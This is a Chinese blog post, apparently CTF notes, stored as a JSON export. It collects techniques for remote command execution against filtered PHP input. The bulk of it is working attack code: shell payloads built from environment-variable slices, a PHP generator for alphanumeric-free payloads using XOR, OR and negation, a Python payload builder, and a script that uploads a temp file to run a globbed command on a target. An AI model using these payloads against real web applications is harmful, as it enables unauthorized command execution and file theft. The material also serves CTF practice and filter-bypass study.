{"pages":[],"posts":[{"title":"代码与命令执行中的常见操作","text":"1.利用系统变量12345678910111213#命令执行，且题目过滤了小写字母#$PATH=环境变量，$PWD=当前目录变量,$SHLVL=1，$PHP_VERSION=php版本，$RANDOM=1000-100000内的数字#${?}=上次命令的执行结果，${#?}=上次命令的执行结果的长度#还有一个$USER,$TERM,$HOSTNAME等#${#RANDOM},获取RANDOM生成的随机数的位数。即#的用途是获取${RANDOM}执行后结果的长度#利用的是shell的格式化字符串#${PATH:5:1}，即读取环境变量的第五位字符；${PATH:~A}，即读取环境变量的最后一位字符#ls${PATH:5:1}${PATH:2:1}#如果当前目录是/var/www/html,下面命令为:nl${IFS}????.???${PATH:~A}${PWD:~A}${IFS}????.??? 2.无字母数字getshell利用取反、异或、或操作制造不可见字符1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date: 2020-11-21 20:31:22*///或function orRce($par1, $par2){ $result = (urldecode($par1)|urldecode($par2)); return $result;}//异或function xorRce($par1, $par2){ $result = (urldecode($par1)^urldecode($par2)); return $result;}//取反function negateRce(){ fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';}//mode=1代表或，2代表异或，3代表取反//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式function generate($mode, $preg='/[0-9]/i'){ if ($mode!=3){ $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;); $contents = &quot;&quot;; for ($i=0;$i&lt;256;$i++){ for ($j=0;$j&lt;256;$j++){ if ($i&lt;16){ $hex_i = '0'.dechex($i); }else{ $hex_i = dechex($i); } if ($j&lt;16){ $hex_j = '0'.dechex($j); }else{ $hex_j = dechex($j); } if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo &quot;&quot;; }else{ $par1 = &quot;%&quot;.$hex_i; $par2 = '%'.$hex_j; $res = ''; if ($mode==1){ $res = orRce($par1, $par2); }else if ($mode==2){ $res = xorRce($par1, $par2); } if (ord($res)&gt;=32&amp;ord($res)&lt;=126){ $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\\n&quot;; } } } } fwrite($myfile,$contents); fclose($myfile); }else{ negateRce(); }}generate(3,'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i'); 1234567891011121314151617181920212223242526# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;or_rce.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; return(output)while True: param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot; print(param) 上传临时文件12345678#coding:utf-8#author yu22ximport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files={'file':'cat f*'}response=requests.post(url,files=files)html = response.textprint(html) 3.只有4，5个字符命令执行写/反弹shell4.利用文件包含详见文件包含中的常见操作 参考链接：https://blog.csdn.net/miuzzx https://y4tacker.blog.csdn.net/","link":"/2021/09/28/%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/"}],"tags":[{"name":"php代码&#x2F;命令执行","slug":"php代码-命令执行","link":"/tags/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"categories":[]}